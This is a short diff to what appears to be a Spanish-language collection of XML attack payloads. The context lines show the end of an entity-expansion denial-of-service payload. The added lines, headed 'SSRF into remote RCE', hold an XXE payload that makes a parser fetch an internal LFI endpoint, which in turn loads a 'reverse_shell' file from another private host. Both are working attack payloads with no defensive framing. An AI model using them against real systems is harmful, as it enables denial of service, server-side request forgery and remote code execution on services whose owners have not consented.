@@ -92,3 +92,10 @@ Esta no funciona si detecta ciclos por defecto, pero se puede hacer así
 <!ENTITY B "&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;">
 ]>
 <xml><cosas>&B;</cosas></xml>
+
+###########SSRF into remote RCE###########
+
+<?xml version="1.0"?>
+<!DOCTYPE hola [
+<!ENTITY xxe SYSTEM "http://172.30.150.3/LFI-parametroget/index.php?fichero=http://172.30.150.2/reverse_shell">]>
+<xml><cosas>&xxe;</cosas></xml>
